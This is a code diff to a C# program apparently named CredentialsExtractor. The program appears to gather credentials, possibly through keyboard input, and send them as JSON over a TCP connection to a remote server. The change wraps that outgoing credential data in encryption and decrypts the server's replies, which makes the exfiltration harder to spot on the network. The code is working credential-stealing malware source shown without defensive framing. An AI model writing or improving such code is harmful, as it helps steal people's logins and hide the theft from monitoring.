@@ -2,6 +2,7 @@
 using CredentialsExtractor.Input;
 using CredentialsExtractor.Logging;
 using CredentialsExtractor.Native;
+using CredentialsExtractor.Cryptography;
 using System.Collections.Concurrent;
 using System.Net.Sockets;
 using System.Text;
@@ -15,6 +16,7 @@ namespace CredentialsExtractor.Core
         private readonly ILogger _logger;
         private readonly IKeyboardManager _keyboardManager;
         private readonly IApplicationIdentifier _appIdentifier;
+        private readonly ICryptographyService _cryptographyService;
         private readonly double _confidenceThreshold;
         private int _consecutiveFailures = 0;
         private int _adaptiveDelayMs = 0;
@@ -45,6 +47,7 @@ namespace CredentialsExtractor.Core
             ILogger logger,
             IKeyboardManager keyboardManager,
             IApplicationIdentifier appIdentifier,
+            ICryptographyService cryptographyService = null,
             double confidenceThreshold = 0.6)
         {
             _config = config;
@@ -52,6 +55,7 @@ namespace CredentialsExtractor.Core
             _keyboardManager = keyboardManager;
             _appIdentifier = appIdentifier;
             _confidenceThreshold = confidenceThreshold;
+            _cryptographyService = cryptographyService ?? CryptographyServiceFactory.CreateDefault();
 
             try
             {
@@ -489,6 +493,18 @@ namespace CredentialsExtractor.Core
                 // Serialize to JSON
                 string jsonData = JsonConvert.SerializeObject(credentialData);
 
+                // Encrypt the JSON data
+                string encryptedData = _cryptographyService.Encrypt(jsonData);
+
+                // Create encrypted message wrapper
+                var encryptedMessage = new
+                {
+                    encrypted = true,
+                    data = encryptedData
+                };
+
+                string messageToSend = JsonConvert.SerializeObject(encryptedMessage);
+
                 // Connect to server
                 using (TcpClient client = new TcpClient())
                 {
@@ -501,8 +517,8 @@ namespace CredentialsExtractor.Core
 
                     using (NetworkStream stream = client.GetStream())
                     {
-                        // Convert the JSON string to bytes
-                        byte[] data = Encoding.UTF8.GetBytes(jsonData + "<END>");
+                        // Convert the encrypted message to bytes
+                        byte[] data = Encoding.UTF8.GetBytes(messageToSend + "<END>");
 
                         // Send the data to the server
                         stream.Write(data, 0, data.Length);
@@ -512,10 +528,26 @@ namespace CredentialsExtractor.Core
                         int bytesRead = stream.Read(responseBuffer, 0, responseBuffer.Length);
                         string response = Encoding.UTF8.GetString(responseBuffer, 0, bytesRead);
 
-                        _logger.Log($"Server response: {response}");
+                        // Try to decrypt response if it's encrypted
+                        try
+                        {
+                            var responseObj = JsonConvert.DeserializeObject<dynamic>(response);
+                            if (responseObj?.encrypted == true)
+                            {
+                                string decryptedResponse = _cryptographyService.Decrypt((string)responseObj.data);
+                                _logger.Log($"Server response (decrypted): {decryptedResponse}");
+                            }
+                            else
+                            {
+                                _logger.Log($"Server response: {response}");
+                            }
+                        }
+                        catch
+                        {
+                            _logger.Log($"Server response: {response}");
+                        }
                     }
                 }
-
             }
             catch (Exception ex)
             {
